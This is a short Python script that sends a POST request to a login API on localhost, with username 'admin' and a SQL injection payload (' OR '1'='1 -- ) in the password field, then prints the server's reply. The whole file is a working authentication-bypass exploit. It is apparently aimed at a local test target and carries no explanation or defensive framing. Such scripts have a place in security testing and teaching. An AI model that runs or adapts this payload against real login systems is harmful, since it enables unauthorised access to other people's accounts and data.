import requests
url = 'http://127.0.0.1:4000/api/login'
headers = {}
data = {'username': 'admin', 'password': "' OR '1'='1 -- "}
response = requests.post(url, headers=headers, data=data)
print(response.json())
